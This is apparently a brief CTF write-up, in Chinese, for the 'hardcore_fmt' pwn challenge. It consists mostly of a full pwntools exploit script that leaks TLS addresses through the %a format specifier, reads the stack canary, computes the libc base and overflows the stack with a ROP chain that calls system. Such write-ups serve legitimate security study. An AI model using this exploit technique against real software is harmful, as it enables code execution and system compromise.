

这题主要是考察格式字符创`%a`这个技巧，这个在之前HCTF中easy_printfver2中非正常解中出现过

本地复现和远程不一样，没有爆破，而且leak出来的值也不完全相同，但是基本思路没错

在TLS中找到canary，爆破libc，栈溢出

```python
from pwn import *

ip = ""
port = 2333
fileName = "hardcore_fmt"
libcName = "libc-2.27.so"
libcver = 2.27

if args["LIBC"]:
    from change import *
    context.terminal = ["terminator", "-e"]
    context.log_level = "debug"
    bin = change_ld(fileName,libcver)
    p = bin.process()
elif args["REMOTE"]:
    p = remote(ip,port)
else:
    from change_ld import *
    context.terminal = ["terminator","-e"]
    context.log_level = "debug"
    bin = change_ld(fileName,"/opt/ctf/ld-2.27-64.so")
    libc = ELF(libcName)
    p = bin.process(env={"LD_PRELOAD":libc.path})

def Debug(cmd=""):
    gdb.attach(p)
    pause()

p.recvuntil("Welcome to hard-core fmt\n")
p.sendline("%a"*5)
p.recvuntil("8p-10220x0.0")
TLS= int(p.recvuntil("p-1",drop="true")[:-1]+'00',16)-0x29180
success("TLS-->"+hex(TLS))
p.sendline(str(TLS+0x29))
p.recvuntil(": ")
canary=u64(p.recv(7).rjust(8,'\x00'))
success("canary-->"+hex(canary))
libc.address = TLS - 0x3f2580
success("libc.address-->"+hex(libc.address))
payload  = "A"*0x108
payload += p64(canary)
payload += "B"*0x18
payload += p64(libc.address+0x5b4fd)+p64(libc.address+0x1b3e9a)+p64(libc.symbols["system"])
p.sendline(payload)
p.interactive()
```

